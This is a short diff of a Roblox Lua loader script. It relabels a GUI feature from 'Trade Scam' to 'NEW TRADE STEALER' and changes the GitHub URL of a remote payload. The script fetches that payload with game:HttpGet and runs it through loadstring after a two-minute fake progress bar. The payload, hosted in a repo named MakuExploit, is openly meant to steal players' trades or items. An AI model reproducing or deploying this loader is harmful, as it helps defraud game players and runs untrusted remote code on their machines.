@@ -64,7 +64,7 @@ Subtitle.BackgroundTransparency = 1
 Subtitle.ZIndex = 6
 
 local FeatureLabel = Instance.new("TextLabel", Frame)
-FeatureLabel.Text = "Trade Scam"
+FeatureLabel.Text = "NEW TRADE STEALER"
 FeatureLabel.TextColor3 = Color3.fromRGB(255, 200, 200)
 FeatureLabel.TextScaled = true
 FeatureLabel.Font = Enum.Font.GothamBold
@@ -111,5 +111,5 @@ TweenService:Create(ProgressBar, TweenInfo.new(120), {
 
 task.delay(120, function()
     Frame:Destroy()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MakuExploit/TradeSCM/refs/heads/main/Tradescm"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MakuExploit/TradeSCM/refs/heads/main/TradeSTLR"))()
 end)
